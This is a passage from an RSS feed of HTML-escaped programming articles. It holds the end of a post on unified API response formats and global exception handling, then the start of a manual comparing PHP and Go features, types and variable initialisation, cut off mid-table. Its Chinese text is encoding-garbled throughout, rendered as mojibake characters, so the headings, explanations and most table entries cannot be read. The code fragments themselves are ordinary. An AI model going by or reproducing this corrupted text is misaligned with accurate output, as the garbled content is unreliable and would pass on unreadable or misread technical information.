&lt;span&gt;&quot;status&quot;&lt;/span&gt;:Â &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;message&quot;&lt;/span&gt;:Â &lt;span&gt;&quot;è‡ªå®šä¹‰å¼‚å¸¸&quot;&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;data&quot;&lt;/span&gt;:Â &lt;span&gt;null&lt;/span&gt;,&lt;br/&gt;Â Â &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;:Â &lt;span&gt;1625796580778&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;å¥½äº†ï¼Œä»Šå¤©çš„æ–‡ç« å°±åˆ°è¿™é‡Œäº†ï¼Œå¸Œæœ›é€šè¿‡è¿™ç¯‡æ–‡ç« ä½ èƒ½æŒæ¡å¦‚ä½•åœ¨ä½ é¡¹ç›®ä¸­å‹å¥½å®ç°ç»Ÿä¸€æ ‡å‡†æ ¼å¼åˆ°è¿”å›å¹¶ä¸”å¯ä»¥ä¼˜é›…çš„å¤„ç†å…¨å±€å¼‚å¸¸ã€‚&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;githubåœ°å€ï¼šhttps://github.com/jianzh5/cloud-blog/&lt;/p&gt;&lt;p data-tool=&quot;mdniceç¼–è¾‘å™¨&quot;&gt;æœ€åï¼Œæˆ‘æ˜¯é£˜æ¸ºJamï¼Œä¸€åå†™ä»£ç çš„æ¶æ„å¸ˆï¼Œåšæ¶æ„çš„ç¨‹åºå‘˜ï¼ŒæœŸå¾…ä½ çš„å…³æ³¨ã€‚å’±ä»¬ä¸‹æœŸè§ï¼&lt;/p&gt;&lt;/section&gt;
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>222ee5f44c264ec4b959b0bd17bf1172</guid>
<title>PHP è½¬ Go é€Ÿå­¦æ‰‹å†Œ</title>
<link>https://toutiao.io/k/d52lqdy</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content &quot; id=&quot;js_content&quot;&gt;
                    

                    
                    
                    
                    &lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-croporisrc=&quot;https://mmbiz.qlogo.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMen5rzMl1aPs0DrQ5QM1LEkibSEBysTibfcus40K5M19yoJzTdQS74BjqA/0?wx_fmt=png&quot; data-cropx1=&quot;0&quot; data-cropx2=&quot;1280&quot; data-cropy1=&quot;102.11502782931355&quot; data-cropy2=&quot;579.443413729128&quot; data-ratio=&quot;0.37265625&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_jpg/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeP9iaUP0OVwSdMRoF30MJkbkzFjYCxib8oRPq3zGuLfuAsmxVN8kwPcSA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1280&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages js_insertlocalimg&quot; data-croporisrc=&quot;https://mmbiz.qlogo.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeV2AhIE1vBglSvOp1mWs819DLzpE9Q9BvBliaFlFCQh4kCRticyPSuLCQ/0?wx_fmt=png&quot; data-cropx1=&quot;0&quot; data-cropx2=&quot;1280&quot; data-cropy1=&quot;126.22837370242216&quot; data-cropy2=&quot;640&quot; data-ratio=&quot;0.40078125&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_jpg/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeWpTnTqsHcYU1HQOcGQ7vAqdkej2u5lGeWeBZfjDibGPecicjwQFsf7ng/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1280&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section class=&quot;code-snippet__fix code-snippet__js&quot;&gt;&lt;pre class=&quot;code-snippet__js&quot; data-lang=&quot;javascript&quot;&gt;&lt;code&gt;&lt;span class=&quot;code-snippet_outer&quot;&gt;é“¾æ¥ğŸ”— http:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/section&gt;&lt;h1 data-line=&quot;13&quot;&gt;&lt;span&gt;å‰è¨€&lt;/span&gt;&lt;br/&gt;&lt;/h1&gt;&lt;p data-line=&quot;15&quot;&gt;&lt;span&gt;æ•´ç†äº†ä¸€ä»½ç®€è¦çš„æ‰‹å†Œï¼Œå¸®åŠ©å¤§å®¶é«˜æ•ˆçš„ä¸Šæ‰‹Goè¯­è¨€ï¼Œä¸»è¦æ˜¯é€šè¿‡å¯¹æ¯”PHPå’ŒGoçš„ä¸åŒç‚¹æ¥å¼ºåŒ–ç†è§£ï¼Œå†…å®¹ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å››éƒ¨åˆ†ï¼š&lt;/span&gt;&lt;/p&gt;&lt;h1 data-line=&quot;22&quot;&gt;&lt;span&gt;è¯­è¨€å±‚é¢å·®å¼‚&lt;/span&gt;&lt;/h1&gt;&lt;pre&gt;&lt;code data-line=&quot;24&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;å¤‡æ³¨ï¼šä¸‹æ–‡åŸºäºPHPä¸»æµphp-fpmæ¨¡å¼ã€‚&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;å¯¹æ¯”é¡¹&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;PHP&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;Go&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;å­—ç¬¦ä¸²è¡¨ç¤º&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å•å¼•å·(PSR)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;åŒå¼•å·&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ‹¼æ¥å­—ç¬¦ä¸²&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;.&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;+&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;è¯­è¨€ç‰ˆæœ¬å…¼å®¹æ€§&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;ä¸å¥½&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å‘ä¸‹å…¼å®¹&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;ä»£ç é£æ ¼&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ— å®˜æ–¹æ ‡å‡†ï¼Œç¤¾åŒºæ ‡å‡†èµ·æ­¥æ™š&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;è‡ªå§‹è‡³ä»Šå®˜æ–¹ç»Ÿä¸€æ ‡å‡†ï¼Œä¸”æä¾›å·¥å…·&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;è„šæœ¬è¯­è¨€&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;ä¸æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;å¼ºç±»å‹è¯­è¨€&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;ä¸æ˜¯(PHP7æ”¯æŒä¸¥æ ¼æ¨¡å¼)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒåƒåœ¾å›æ”¶&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;é¢å‘å¯¹è±¡è¯­è¨€(OOP)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;ç¥ä¼¼&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;éƒ¨åˆ†æ”¯æŒï¼Œæ ¸å¿ƒæ˜¯åˆæˆå¤ç”¨&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒç»§æ‰¿&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å¦(æœ‰åˆæˆå¤ç”¨)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒinterface&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒtry...catch...&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å¦&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒåŒ…ç®¡ç†&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒè·¨å¹³å°&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;ç¯å¢ƒæ­å»ºæˆæœ¬&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;é«˜&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;ä½&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ‰§è¡Œæ–¹å¼&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;cliå‘½ä»¤è¡Œæ¨¡å¼ã€php-fpmæ¨¡å¼(â‘ )&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;äºŒè¿›åˆ¶&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;è¿›ç¨‹æ¨¡å‹&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å¤šè¿›ç¨‹&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å•è¿›ç¨‹&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;åŸç”Ÿæ˜¯å¦æ”¯æŒåˆ›å»ºTCP/UDPæœåŠ¡&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯(æ”¯æŒä¸å¥½ï¼Œç”Ÿäº§ä¸å¯ç”¨)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;åŸç”Ÿæ˜¯å¦æ”¯æŒåˆ›å»ºHTTPæœåŠ¡&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯(æ”¯æŒä¸å¥½ï¼Œç”Ÿäº§ä¸å¯ç”¨)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;è¿›ç¨‹é˜»å¡æ€§&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å¦&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒåç¨‹&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å¦(â‘¡)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;å¹¶å‘èƒ½åŠ›(â‘¢)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å¼±&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æå¼º&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦å¸¸é©»å†…å­˜è¿è¡Œ&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;ä¸æ˜¯(â‘£)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;å¼•å…¥æ–‡ä»¶æ–¹å¼&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;require&lt;/span&gt;&lt;/code&gt;&lt;span&gt;æˆ–è€…&lt;/span&gt;&lt;code&gt;&lt;span&gt;include&lt;/span&gt;&lt;/code&gt;&lt;span&gt;å¯¹åº”æ–‡ä»¶&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;import&lt;/span&gt;&lt;/code&gt;&lt;span&gt;å¯¼å…¥åŒ…&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒå•å…ƒæµ‹è¯•&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒåŸºå‡†æµ‹è¯•(benchmark)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å¦&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ˜¯&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ˜¯å¦æ”¯æŒæ€§èƒ½åˆ†æ&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ”¯æŒ(xhprof/tideways)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ”¯æŒ(pprof/dlv)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æ€§èƒ½åˆ†æå·¥å…·ä½¿ç”¨æˆæœ¬&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;é«˜(è£…æ‰©å±•æˆæœ¬é«˜)&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æä½&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;pre&gt;&lt;code data-line=&quot;58&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;â‘ å…¶ä»–æ¨¡å¼è¿˜æœ‰swooleç­‰&lt;br/&gt;â‘¡PHPçš„swooleåç¨‹æ¡†æ¶ç­‰æ”¯æŒåç¨‹&lt;br/&gt;â‘¢æ­¤å¤„ä¸è€ƒè™‘I/Oå¤šè·¯å¤ç”¨ï¼ŒPHPçš„swooleåç¨‹æ¡†æ¶ç­‰ä¹Ÿæ”¯æŒåç¨‹å¹¶å‘&lt;br/&gt;â‘£PHPçš„swooleåç¨‹æ¡†æ¶æ˜¯å¸¸é©»å†…å­˜ï¼Œcliå‘½ä»¤è¡Œæ¨¡å¼ä¹Ÿå¯ä»¥å¸¸é©»å†…å­˜ç­‰&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;65&quot;&gt;&lt;span&gt;åˆšå¼€å§‹ç”±PHPè¯­è¨€è½¬Goè¯­è¨€çš„è¿‡ç¨‹ï¼Œé‡ç‚¹æ˜¯ç¼–ç¨‹æ„è¯†çš„è½¬å˜ï¼Œå°¤å…¶æ˜¯ä»¥ä¸‹å‡ ç‚¹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;å¼ºç±»å‹&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;å¸¸é©»å†…å­˜è¿è¡Œ&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;ç†è§£å’Œä½¿ç”¨æŒ‡é’ˆ&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;å¹¶å‘å®‰å…¨&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;èµ„æºåŠæ—¶é‡Šæ”¾æˆ–è¿”è¿˜&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h1 data-line=&quot;72&quot;&gt;&lt;span&gt;åŸºç¡€è¯­æ³•å·®å¼‚&lt;/span&gt;&lt;/h1&gt;&lt;pre&gt;&lt;code data-line=&quot;74&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;å¤‡æ³¨ï¼šä¸‹æ–‡åŸºäºPHP5.4+ç‰ˆæœ¬&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;77&quot;&gt;&lt;span&gt;å¸¸ç”¨åŸºæœ¬ç±»å‹å¯¹æ¯”&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;79&quot;&gt;&lt;span&gt;PHPç±»å‹æ¯”è¾ƒå°‘å’Œç®€å•ï¼ŒPHPå¸¸ç”¨æ•°æ®ç±»å‹æœ‰booleanå¸ƒå°”å€¼ã€stringå­—ç¬¦ä¸²ã€intæ•´å‹ã€floatæµ®ç‚¹å‹ã€arrayæ•°ç»„ã€objectå¯¹è±¡ã€‚&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;81&quot;&gt;&lt;span&gt;PHPå¸¸ç”¨æ•°æ®ç±»å‹å’ŒGoè¯­è¨€å¯¹åº”æˆ–è€…ç±»ä¼¼çš„ç±»å‹åšä¸ªå¯¹æ¯”ï¼Œå¦‚ä¸‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;è¯­è¨€\ç±»å‹&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;boolean&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;string&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;int&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;float&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;array&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;object&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;PHP&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;bool&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;string&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;int&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;float&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;array(1,2,3)ç´¢å¼•æ•°ç»„ã€array(&#x27;1&#x27; =&amp;gt; 1, &#x27;2&#x27; =&amp;gt; 2, &#x27;3&#x27; =&amp;gt; 3)å…³è”æ•°ç»„&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;å®ä¾‹åŒ–ç±»class&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Go&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;bool&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;string&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;intã€int8ã€int16ã€int32ã€int64ã€uintã€uint8ã€uint16ã€uint32ã€uint64&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;float32ã€float64&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;[length]type&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;æ¯”è¾ƒåƒstruct&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p data-line=&quot;88&quot;&gt;&lt;span&gt;é™¤æ­¤ä¹‹å¤–Goè¿˜æ”¯æŒæ›´ä¸°å¯Œçš„ç±»å‹ï¼š&lt;/span&gt;&lt;/p&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;ç±»å‹&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;sliceåˆ‡ç‰‡(ç›¸å½“äºPHPçš„ç´¢å¼•æ•°ç»„)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;map(ç›¸å½“äºPHPçš„å…³è”æ•°ç»„)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;channel(ç®¡é“ï¼Œé€šè¿‡é€šä¿¡å…±äº«ï¼Œä¸è¦é€šè¿‡å…±äº«æ¥é€šä¿¡)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;æŒ‡é’ˆ(Goè¯­è¨€çš„å€¼ç±»å‹éƒ½æœ‰å¯¹åº”çš„æŒ‡é’ˆç±»å‹)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;byte(å­—èŠ‚ï¼Œå¯¹åº”uint8åˆ«åï¼Œå¯ä»¥è¡¨ç¤ºAscaiiç )&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;rune(å¯¹åº”int32ï¼Œå¯ä»¥è¡¨ç¤ºunicode)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;ç­‰ç­‰&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;è‡ªå®šä¹‰ç±»å‹ï¼Œä¾‹å¦‚&lt;/span&gt;&lt;code&gt;&lt;span&gt;type userDefinedType int32&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 data-line=&quot;100&quot;&gt;&lt;span&gt;å¸¸ç”¨åŸºæœ¬ç±»å‹åˆå§‹åŒ–æ–¹å¼å¯¹æ¯”&lt;/span&gt;&lt;/h2&gt;&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;&lt;span&gt;ç±»å‹&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;PHP&lt;/span&gt;&lt;/th&gt;&lt;th&gt;&lt;span&gt;Go(å®šä¹‰å˜é‡å¸¦&lt;/span&gt;&lt;code&gt;&lt;span&gt;var&lt;/span&gt;&lt;/code&gt;&lt;span&gt;å…³é”®å­—ï¼Œæˆ–è€…ä¸å¸¦ç›´æ¥ä½¿ç”¨è¯­æ³•ç³–&lt;/span&gt;&lt;code&gt;&lt;span&gt;:=&lt;/span&gt;&lt;/code&gt;&lt;span&gt;)&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;boolean&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varStr = true;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varStr bool = true&lt;/span&gt;&lt;/code&gt;&lt;br/&gt;&lt;span&gt;æˆ–è€…Â &lt;/span&gt;&lt;code&gt;&lt;span&gt;var varStr = true&lt;/span&gt;&lt;/code&gt;&lt;br/&gt;&lt;span&gt;æˆ–è€…Â &lt;/span&gt;&lt;code&gt;&lt;span&gt;varStr := true&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;string&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varStr = &#x27;demo&#x27;;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varStr string = &quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;br/&gt;&lt;span&gt;æˆ–è€…Â &lt;/span&gt;&lt;code&gt;&lt;span&gt;varStr := &quot;&quot;&lt;/span&gt;&lt;/code&gt;&lt;span&gt;(:=å†™æ³•ä¸‹é¢çœç•¥)&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;int32&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varNum = 0;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varInt32 int32 = 0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;int64&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;åŒä¸Š&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varInt64 int64 = 0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;float32&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varNum = 0.01;&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varFloat32 float32 = 0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;float64&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;span&gt;åŒä¸Š&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varFloat64 float64 = 0&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;array&lt;/span&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;$varArray = array();&lt;/span&gt;&lt;/code&gt;&lt;br/&gt;&lt;span&gt;æˆ–è€…è¯­æ³•ç³–&lt;/span&gt;&lt;code&gt;&lt;span&gt;$varArray = [];&lt;/span&gt;&lt;/code&gt;&lt;/td&gt;&lt;td&gt;&lt;code&gt;&lt;span&gt;var varArray [6]int32 = 